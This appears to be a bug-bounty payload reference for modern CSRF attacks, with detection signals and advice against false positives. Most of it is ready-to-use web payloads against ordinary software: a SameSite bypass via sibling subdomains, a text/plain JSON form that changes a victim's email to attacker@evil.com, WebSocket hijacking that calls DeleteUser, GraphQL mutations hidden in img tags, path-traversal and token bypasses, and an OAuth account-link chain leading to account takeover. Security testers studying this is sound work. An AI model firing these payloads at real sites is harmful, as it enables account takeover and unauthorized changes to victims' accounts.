# CSRF (modern variants) — payload reference

> Class: cross-site state-change → ATO / account-link / email-change. Cross-ref:
> `invariant_library.md` → `## § Web2` → the `session` rows (`SameSite` cookie flags, server-side
> invalidation) and `iframe frame-ancestors` (sibling-subdomain asymmetry). **Browser-model rule:
> curl ≠ browser.** curl sends the cookie with `SameSite=Lax/Strict`; the browser does NOT on a
> cross-site POST. The PoC MUST work from a foreign origin in a real browser, otherwise it is a
> false positive.

## SameSite check (what is actually exploitable)

- `SameSite=None` (+Secure) → cookie on every cross-site request → CSRF possible.
- `SameSite=Lax` (or unset = Lax by default) → cookie only on top-level GET navigation → a
  cross-site POST is **blocked**; exploitable only if the action is reachable via GET or a
  POST→GET redirect.
- `SameSite=Strict` → nothing cross-site.

## Payloads

- **SameSite=Lax bypass via a sibling subdomain** (Argo CD CVE-2024-22424): `Lax` is useless if the
  attacker controls ANY sibling of the parent domain. Host the payload on `marketing.victim.com`,
  hit `app.internal.victim.com`: `fetch('https://app.internal.victim.com/api/v1/...', {method:'POST',
  credentials:'include', body:'{...}'})` — same-site, the cookie is sent. Stronger if Content-Type
  is not enforced.
  - Detection Signal: the state-change executed, the response is 200 with an effect; in the browser
    (not curl) the cookie attached to the same-site request.
- **JSON-CSRF via `text/plain`** (bypassing Content-Type enforcement without a preflight): an HTML
  form with `enctype="text/plain"` and input names forming valid JSON:
  `<form method=POST action="https://target/api/settings" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'></form>` + auto-submit. The browser
  sends `{"email":"attacker@evil.com","x":"="}` as a simple request (no OPTIONS).
  - Detection Signal: the server parsed the JSON body and applied the change; no preflight occurred.
- **CSWSH (CSRF over WebSocket)**: a browser WS does not send custom headers → `X-CSRF`/the token is
  not enforced on upgrade. A cross-origin page: `new WebSocket("wss://target/hubs/admin")` — the
  cookie attaches (ambient), then invoke a hub method with a standard JSON frame (SignalR
  `DeleteUser(id)`).
  - Detection Signal: `101 Switching Protocols` without Origin validation + a mutating hub method
    executes on behalf of the victim.
- **GraphQL mutation via GET** (GitLab H1 #1122408): the backend skips `X-CSRF` when method=GET, and
  GraphQL accepts a mutation in the query string: `<img src="https://target/api/graphql?query=mutation{
  createSnippet(input:{title:%22x%22,content:%22pwn%22}){snippet{id}}}">`.
  - Detection Signal: the mutation executed via a simple `<img>`/GET (an object was created/changed).
- **Origin-omission / null-Origin**: a sandbox iframe `<iframe sandbox="allow-scripts allow-forms">`
  yields `Origin: null`; an HTTPS→HTTP transition strips the Referer. Hits a server that validates
  ONLY the presence of Origin/Referer, not the value, or that trusts null.
  - Detection Signal: a request without Origin (or with Origin: null) is accepted and state changes.
- **Method-override CSRF-middleware bypass**: if the CSRF middleware covers POST/PUT/DELETE but not
  `PATCH` (or vice versa), repeat the same action with the uncovered method. Also `_method=PUT` /
  `X-HTTP-Method-Override` on a POST.
  - Detection Signal: the uncovered method yields the same state-change without a valid token (200
    instead of 403).
- **Token-omission / substitution / static-token**: (a) drop the CSRF field entirely; (b) substitute
  a token from another session; (c) compare `authenticity_token`/`csrfmiddlewaretoken` between two
  logins — if it is static per-session or reusable cross-user, it can be stolen (Referer/cache/XSS)
  and does not protect.
  - Detection Signal: 200 with no token / with another user's token / the token is identical across
    sessions.
- **Path-traversal CSRF-scope bypass** (GHES CVE-2022-23732): the router matches the post-traversal
  path for execution but the pre-traversal path for CSRF scope:
  `action="https://ghes/setup/api/start/..%2f..%2fadmin%2fusers"`.
  - Detection Signal: a protected endpoint is reached without a valid token.

## Chain → ATO (the most valuable)

- **Social-account-link CSRF** (Rockstar/Oculus/HackerOne #1727221): CSRF on an OAuth link callback
  binds the ATTACKER'S social account to the victim's session → the attacker logs in via their own
  Google/FB → ATO. `<img src="https://target/users/social_accounts/google?code=ATTACKER_CODE&state=PREDICTABLE">`.
- **CSRF on `/settings/email` or `/settings/password`** (if re-auth is skipped) → change of
  contact/password → ATO.
- **Duende BFF `X-CSRF: 1`** — a non-user-bound static header; cross-role replay same-origin +
  SignalR carve-out (CSWSH) + a cookie-domain wildcard → session fixation.

## Anti-FP / what NOT to submit on its own

- **Login-CSRF / logout-CSRF on its own** — informational, do NOT submit without a chain
  (session-fixation, etc.). "Token missing" ≠ impact.
- **SameSite=Lax on a POST endpoint, "worked in curl"** — false positive: the browser will block the
  cookie. Verify from a real browser on a foreign origin.
- **Dropped the token → 200** ≠ broken validation — the endpoint may be protected by a
  double-submit-cookie / a custom header. Verify the mechanism.
- **CORS-preflight bypass ≠ CSRF** — different classes.
- **Gate 0**: the victim must CONCRETELY lose something (account access / money / data),
  reproducibly in ≤10 min from a clean state.
